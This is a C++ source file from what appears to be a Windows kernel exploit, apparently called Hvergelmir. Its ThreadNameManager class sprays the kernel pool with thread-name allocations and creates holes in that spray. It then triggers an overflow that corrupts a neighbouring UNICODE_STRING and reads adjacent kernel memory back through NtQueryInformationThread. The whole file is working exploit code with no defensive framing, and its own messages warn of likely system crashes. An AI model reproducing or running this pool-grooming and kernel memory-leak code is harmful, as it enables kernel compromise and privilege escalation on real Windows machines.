
#include "ThreadNameManager.h"
#include "functions.h"
#include "Hvergelmir.h"
#include <memory>

// exitEvent is created once in the constructor to ensure proper error handling
static HANDLE exitEvent = NULL;

DWORD WINAPI DummyThread(LPVOID lpParam) {
	// Wait on event; if event handle is invalid just exit
	if (exitEvent == NULL) return 0;
	WaitForSingleObject(exitEvent, INFINITE);
	return 0;
}


ThreadNameManager::ThreadNameManager()
{
	leakThread = NULL;
	nameSize = NULL;
	threadCount = 0;
	threads = NULL;
	leakSize = 0;
	leakReadCount = 0;
	refreshLeak = false;

	HMODULE ntDLL = GetModuleHandleA("ntdll.dll");

	if (!ntDLL)
	{
         DEBUG_PRINT(" [!] Could not get NTDLL for ThreadNameManager\n");
		return;
	}

	_NtSetInformationThread = (pNtSetInformationThread)GetProcAddress(ntDLL, "NtSetInformationThread");
	_NtQueryInformationThread = (pNtQueryInformationThread)GetProcAddress(ntDLL, "NtQueryInformationThread");



	// create an event used by dummy threads to wait on and to signal shutdown
	if (exitEvent == NULL) {
		exitEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
		if (!exitEvent) {
			DEBUG_PRINT(" [!] Failed to create exitEvent for ThreadNameManager\n");
		}
	}
}


bool ThreadNameManager::GetDataLeak(UINT64 iChunkSize, UINT64 iLeakSize, UINT64 maxRetries)
{
    if (iChunkSize <= offsetof(UNICODE_STRING, Buffer) + 0x20) {
		DEBUG_PRINT(" [!] Invalid chunk size\n");
		return false;
	}
	nameSize = iChunkSize - offsetof(UNICODE_STRING, Buffer) - 0x20;
	leakThread = NULL;
	leakReadCount = 0;
	refreshLeak = false;

	DEBUG_PRINT("\n [*] #### Corrupting ThreadName to Leak Data (VOLATILE) ####\n");

    // Decide how many threads to create based on system uptime. Creating more threads
	// increases the chance of desired LFH layout on freshly booted systems, but
	// is heavier on long-running systems. Use a simple threshold (2 hours).
	UINT64 startLeakSize = iLeakSize;
	if (THREADNAME_USE_ADAPTIVE_LEAK_SIZE && startLeakSize > THREADNAME_MAX_RELIABLE_LEAK_SIZE)
		startLeakSize = THREADNAME_MAX_RELIABLE_LEAK_SIZE;

	for (UINT64 currentLeakSize = startLeakSize;
		currentLeakSize >= THREADNAME_MIN_LEAK_SIZE;
		currentLeakSize -= THREADNAME_ADAPTIVE_LEAK_STEP)
	{
		leakSize = currentLeakSize;

		ThreadNameOverflow tnOverflow;

		tnOverflow.poolHeader.poolTag = 0x6d4e6854;
		tnOverflow.poolHeader.blockSize = 0x10;
		tnOverflow.poolHeader.poolType = 0x02;

		tnOverflow.threadName.Length = nameSize + leakSize;
		tnOverflow.threadName.MaximumLength = nameSize + leakSize;

		DEBUG_PRINT(" [*] Trying ThreadName leak window: 0x%llx\n", (unsigned long long)leakSize);

		if (THREADNAME_PREFILL_SPRAY_COUNT > 0) {
			CreateThreads(THREADNAME_PREFILL_SPRAY_COUNT);
			ClearThreads();
		}

		for (UINT64 i = 0; i < maxRetries; i++)
		{
			if (THREADNAME_USE_STAGED_ALLOCATION) {
				CreateThreads(THREADNAME_FIRST_SPRAY_COUNT);
				CreateThreads(THREADNAME_HOLE_SPRAY_COUNT);
				FreeSlots(THREADNAME_FIRST_SPRAY_COUNT, THREADNAME_HOLE_INTERVAL);
				if (THREADNAME_PRE_PRIME_SETTLE_MS > 0)
					Sleep(THREADNAME_PRE_PRIME_SETTLE_MS);
				Hvergelmir::getInstance().PrimeOverflow(iChunkSize);

				CreateThreads(THREADNAME_REFILL_COUNT);
				if (THREADNAME_PRE_TRIGGER_SETTLE_MS > 0)
					Sleep(THREADNAME_PRE_TRIGGER_SETTLE_MS);
				Hvergelmir::getInstance().TriggerOverflow((BYTE*)&tnOverflow, 0x24);
			}
			else {
				CreateThreads(THREADNAME_SIMPLE_SPRAY_COUNT);
				Hvergelmir::getInstance().PrimeOverflow(iChunkSize);
				if (THREADNAME_SIMPLE_PRE_TRIGGER_SETTLE_MS > 0)
					Sleep(THREADNAME_SIMPLE_PRE_TRIGGER_SETTLE_MS);
				Hvergelmir::getInstance().TriggerOverflow((BYTE*)&tnOverflow, 0x24);
			}

			leakThread = ScanForCorruptName();

			if (leakThread)
			{
				leakReadCount = 0;
				refreshLeak = false;
				DEBUG_PRINT(" [*] ###### Found ThreadName Overwrite ######\n");
				CleanExtraThreads();
				return true;
			}
			DEBUG_PRINT("       Retrying Pool Layout\n");
			ClearThreads();
		}

		if (!THREADNAME_USE_ADAPTIVE_LEAK_SIZE ||
			currentLeakSize == THREADNAME_MIN_LEAK_SIZE ||
			currentLeakSize < THREADNAME_ADAPTIVE_LEAK_STEP)
			break;

		DEBUG_PRINT(" [*] Reducing ThreadName leak window after unstable attempts\n");

	}
	DEBUG_PRINT(" [!] Failed to Corrupt ThreadName, Likelyhood of BSOD is HIGH! Exiting\n");
	return false;
}



void ThreadNameManager::CreateThreads(UINT64 iThreadCount)
{
    // Guard against invalid nameSize or missing APIs
	if (nameSize == 0 || !_NtSetInformationThread) return;
	if (exitEvent) ResetEvent(exitEvent);
	if (iThreadCount == 0) return;
	if (threadCount > 0 && !threads) {
		DEBUG_PRINT(" [!] Thread handle state was inconsistent; resetting tracked thread count\n");
		threadCount = 0;
	}

	// Prepare payload and THREAD_NAME_INFORMATION
	std::vector<WCHAR> payload(nameSize / sizeof(WCHAR));
	std::fill(payload.begin(), payload.end(), L'A');

	THREAD_NAME_INFORMATION threadName = { 0 };
	threadName.ThreadName.Buffer = payload.data();
	threadName.ThreadName.Length = (USHORT)nameSize;
	threadName.ThreadName.MaximumLength = (USHORT)nameSize;

	UINT64 startIndex = threadCount;
	UINT64 newThreadCount = threadCount + iThreadCount;
	if (newThreadCount < threadCount) {
		DEBUG_PRINT(" [!] Thread count overflow while allocating handles\n");
		return;
	}

	HANDLE* newThreads = (HANDLE*)calloc((size_t)newThreadCount, sizeof(HANDLE));
	if (!newThreads) {
		DEBUG_PRINT(" [!] Failed to allocate thread handles array for %llu handles\n", (unsigned long long)newThreadCount);
		return;
	}

	if (threads && threadCount > 0)
		memcpy(newThreads, threads, (size_t)threadCount * sizeof(HANDLE));

	free(threads);
	threads = newThreads;
	threadCount = newThreadCount;

    for (UINT64 i = 0; i < iThreadCount; i++) {
		UINT64 threadIndex = startIndex + i;
		HANDLE h = CreateThread(NULL, 0, DummyThread, NULL, 0, NULL);
		if (h == NULL) {
			DEBUG_PRINT(" [!] CreateThread failed at index %llu\n", threadIndex);
			threads[threadIndex] = NULL;
			continue;
		}
		threads[threadIndex] = h;

		// Only call if function pointer is valid
		if (_NtSetInformationThread) {
			_NtSetInformationThread(threads[threadIndex], ThreadNameInformation, &threadName, sizeof(threadName));
		}
	}

	DEBUG_PRINT(" [*] Created %llu threads, total tracked threads: %llu\n", (unsigned long long)iThreadCount, (unsigned long long)threadCount);
}

HANDLE ThreadNameManager::ScanForCorruptName()
{
	if (!_NtQueryInformationThread || nameSize == 0 || threadCount == 0) return NULL;

    size_t bufSize = (size_t)nameSize + (size_t)leakSize + THREADNAME_LEAK_QUERY_HEADROOM;
	if (bufSize == 0 || bufSize > THREADNAME_MAX_LEAK) {
		DEBUG_PRINT(" [!] Invalid buffer size for ScanForCorruptName: %llu\n", (unsigned long long)bufSize);
		return NULL;
	}

	const ULONG minLeakReturn = (ULONG)(nameSize + 0x10);
	const ULONG maxLeakReturn = (ULONG)(nameSize + leakSize + THREADNAME_LEAK_RETURN_HEADROOM);

	BYTE* buffer = (BYTE*)malloc(bufSize);
	if (!buffer) {
		DEBUG_PRINT(" [!] Failed to allocate buffer in ScanForCorruptName\n");
		return NULL;
	}

	ULONG returnLength = 0;
	for (UINT64 idx = 0; idx < threadCount; ++idx)
	{
		HANDLE t = threads[idx];
		if (t == NULL || t == INVALID_HANDLE_VALUE) continue;

		NTSTATUS status = _NtQueryInformationThread(t, ThreadNameInformation, buffer, (ULONG)bufSize, &returnLength);
		if (!NT_SUCCESS(status)) continue;

		if (returnLength > minLeakReturn && returnLength <= maxLeakReturn && VerifyLeakThread(t)) {
			leakThread = t;
			free(buffer);
			return t;
		}
		else if (returnLength > maxLeakReturn) {
			DEBUG_PRINT(
				" [*] Ignoring oversized ThreadName leak candidate at index %llu: returnLength=%lu max=%lu\n",
				(unsigned long long)idx,
				returnLength,
				maxLeakReturn
			);
		}
	}

	free(buffer);
	return NULL;
}

bool ThreadNameManager::VerifyLeakThread(HANDLE t)
{
	if (!_NtQueryInformationThread || t == NULL || t == INVALID_HANDLE_VALUE)
		return false;

	size_t bufSize = (size_t)nameSize + (size_t)leakSize + THREADNAME_LEAK_QUERY_HEADROOM;
	if (bufSize == 0 || bufSize > THREADNAME_MAX_LEAK)
		return false;

	const ULONG minLeakReturn = (ULONG)(nameSize + 0x18);
	const ULONG maxLeakReturn = (ULONG)(nameSize + leakSize + THREADNAME_LEAK_RETURN_HEADROOM);

	std::vector<BYTE> data(bufSize);
	for (UINT64 attempt = 0; attempt < THREADNAME_VERIFY_READS; ++attempt) {
		ULONG returnLength = 0;
		std::fill(data.begin(), data.end(), 0);

		NTSTATUS status = _NtQueryInformationThread(t, ThreadNameInformation, data.data(), (ULONG)bufSize, &returnLength);
		if (!NT_SUCCESS(status) || returnLength < minLeakReturn || returnLength > maxLeakReturn) {
			DEBUG_PRINT(
				" [*] Rejecting unstable ThreadName candidate: verify=%llu status=0x%X returnLength=%lu\n",
				(unsigned long long)attempt,
				status,
				returnLength
			);
			return false;
		}
	}

	return true;
}

std::vector<BYTE> ThreadNameManager::LeakData()
{
    std::vector<BYTE> empty; 
	if (!leakThread) {
		DEBUG_PRINT(" [!] Leak Thread has not yet been Located!\n");
		return empty;
	}
	if (leakReadCount >= THREADNAME_MAX_READS_PER_LEAK) {
		DEBUG_PRINT(
			" [*] ThreadName leak read budget exhausted (%llu/%llu); refreshing leak\n",
			(unsigned long long)leakReadCount,
			(unsigned long long)THREADNAME_MAX_READS_PER_LEAK
		);
		refreshLeak = true;
		return empty;
	}
    // _NtQueryInformationThread is expected to return leakSize bytes for the leak
	// guard against absurd sizes
	if (leakSize == 0 || leakSize > THREADNAME_MAX_LEAK) {
		DEBUG_PRINT(" [!] Invalid or too large leakSize: %llu\n", (unsigned long long)leakSize);
		return empty;
	}

    // Keep the query bounded to the leak size we intentionally requested.
	size_t bufSize = (size_t)nameSize + (size_t)leakSize + THREADNAME_LEAK_QUERY_HEADROOM;
	if (bufSize > THREADNAME_MAX_LEAK) {
		DEBUG_PRINT(" [!] Computed bufSize too large: %llu\n", (unsigned long long)bufSize);
		return empty;
	}

	const ULONG minLeakReturn = (ULONG)(nameSize + 0x18);
	const ULONG maxLeakReturn = (ULONG)(nameSize + leakSize + THREADNAME_LEAK_RETURN_HEADROOM);

	if (!_NtQueryInformationThread) return empty;

	std::vector<BYTE> data;
	ULONG returnLength = 0;
	NTSTATUS status = STATUS_UNSUCCESSFUL;

    const int MAX_ATTEMPTS = 10;
	int attempt = 0;

	while (attempt < MAX_ATTEMPTS) {
		data.assign(bufSize, 0);
		++leakReadCount;

		status = _NtQueryInformationThread(leakThread, ThreadNameInformation, data.data(), (ULONG)bufSize, &returnLength);
		DEBUG_PRINT(" [*] LeakData attempt %d: status=0x%X returnLength=%lu bufSize=%llu\n", attempt, status, returnLength, (unsigned long long)bufSize);
		if (NT_SUCCESS(status) && returnLength >= minLeakReturn && returnLength <= maxLeakReturn) break;

		if (NT_SUCCESS(status) && returnLength > maxLeakReturn) {
			DEBUG_PRINT(" [!] Ignoring oversized leak read: returnLength=%lu max=%lu\n", returnLength, maxLeakReturn);
			return empty;
		}

        if (status == STATUS_BUFFER_TOO_SMALL || returnLength > (ULONG)bufSize) {
			size_t newSize = bufSize * 2;
            if (returnLength > 0) {
				size_t candidate = (size_t)returnLength + THREADNAME_LEAK_QUERY_HEADROOM;
				newSize = (newSize > candidate) ? newSize : candidate;
			}
			if (newSize > THREADNAME_MAX_LEAK || newSize > (size_t)maxLeakReturn + THREADNAME_LEAK_QUERY_HEADROOM) {
				DEBUG_PRINT(" [!] Required leak buffer too large: %llu\n", (unsigned long long)newSize);
				break;
			}
			bufSize = newSize;
			attempt++;
			continue;
		}

		// other failure
		break;
	}

	if (!NT_SUCCESS(status) || returnLength == 0) {
		DEBUG_PRINT(" [!] Data Leak Failed! status=0x%X ret=%lu\n", status, returnLength);
		return empty;
	}

	// Compute copy length after UNICODE_STRING data
	size_t copyLen = 0;
	if (returnLength > (ULONG)nameSize + 0x18) {
		copyLen = (size_t)((ULONG)returnLength - (ULONG)nameSize - 0x18);
	}
	std::vector<BYTE> output(copyLen);
	if (copyLen > 0) memcpy(output.data(), data.data() + nameSize + 0x18, copyLen);
	return output;
}

bool ThreadNameManager::ShouldRefreshLeak()
{
	return refreshLeak;
}

BYTE* ThreadNameManager::LeakDataMalloc()
{
	std::vector<BYTE> v = LeakData();
	if (v.empty()) return NULL;
	BYTE* ptr = (BYTE*)calloc((size_t)leakSize, 1);
	if (!ptr) return NULL;
	size_t copySize = v.size();
	if (copySize > (size_t)leakSize)
		copySize = (size_t)leakSize;
	memcpy(ptr, v.data(), copySize);
	return ptr;
}


void ThreadNameManager::FreeSlots(UINT64 iStartCount, UINT64 iInterval)
{
	// Free every nth thread slot to create holes in the pool
	if (iInterval == 0) return;

	WCHAR emptyName = L'\0';
	THREAD_NAME_INFORMATION emptyThreadName = { 0 };
	emptyThreadName.ThreadName.Buffer = &emptyName;
	emptyThreadName.ThreadName.Length = 0;
	emptyThreadName.ThreadName.MaximumLength = sizeof(emptyName);

	if (!_NtSetInformationThread || threadCount == 0) return;

	UINT64 cleared = 0;
	UINT64 failed = 0;
	for (UINT64 i = iStartCount; i < threadCount; i += iInterval) {
		if (threads[i] == NULL || threads[i] == INVALID_HANDLE_VALUE) continue;

		NTSTATUS status = _NtSetInformationThread(threads[i], ThreadNameInformation, &emptyThreadName, sizeof(emptyThreadName));
		if (NT_SUCCESS(status))
			++cleared;
		else {
			++failed;
			DEBUG_PRINT(" [!] Failed to free thread name slot at index %llu. Status: 0x%X\n", (unsigned long long)i, status);
		}
	}

	DEBUG_PRINT(" [*] Freed %llu thread name slots, %llu failed\n", (unsigned long long)cleared, (unsigned long long)failed);
}

void ThreadNameManager::CleanExtraThreads()
{

    if (!leakThread)
	{
		DEBUG_PRINT(" [!] Leak Thread not yet Found, Cant Clean Threads\n");
		return;
	}


	WCHAR emptyName = L'\0';
	THREAD_NAME_INFORMATION emptyThreadName = { 0 };
	emptyThreadName.ThreadName.Buffer = &emptyName;
	emptyThreadName.ThreadName.Length = 0;
	emptyThreadName.ThreadName.MaximumLength = sizeof(emptyName);

	UINT64 cleared = 0;
	UINT64 failed = 0;

	for (UINT64 i = 0; i < threadCount; i += 1) {
		HANDLE thread = threads[i];
		if (thread == NULL || thread == INVALID_HANDLE_VALUE || thread == leakThread)
			continue;

		NTSTATUS status = _NtSetInformationThread(thread, ThreadNameInformation, &emptyThreadName, sizeof(emptyThreadName));
		if (NT_SUCCESS(status))
			++cleared;
		else {
			++failed;
			DEBUG_PRINT(" [!] Failed to clear thread name at index %llu. Status: 0x%X\n", (unsigned long long)i, status);
		}
	}

	DEBUG_PRINT(" [*] Cleaned %llu extra thread names, %llu failed\n", (unsigned long long)cleared, (unsigned long long)failed);
}


void ThreadNameManager::ClearThreads()
{
    if (exitEvent) SetEvent(exitEvent);

    if (threadCount > 0 && threads) {
		const DWORD maxWaitHandles = MAXIMUM_WAIT_OBJECTS;
		HANDLE waitHandles[MAXIMUM_WAIT_OBJECTS] = { 0 };

		for (UINT64 base = 0; base < threadCount;) {
			DWORD waitCount = 0;
			while (base < threadCount && waitCount < maxWaitHandles) {
				HANDLE thread = threads[base++];
				if (thread != NULL && thread != INVALID_HANDLE_VALUE)
					waitHandles[waitCount++] = thread;
			}

			if (waitCount > 0)
				WaitForMultipleObjects(waitCount, waitHandles, TRUE, 5000);
		}

		for (UINT64 i = 0; i < threadCount; i++) {
			if (threads[i] != NULL && threads[i] != INVALID_HANDLE_VALUE) {
				CloseHandle(threads[i]);
				threads[i] = NULL;
			}
		}
		free(threads);
		threads = NULL;
		threadCount = 0;
		leakThread = NULL;
		leakReadCount = 0;
		refreshLeak = false;
        // reset the exit event so future threads will wait again
		if (exitEvent) ResetEvent(exitEvent);
	}
}
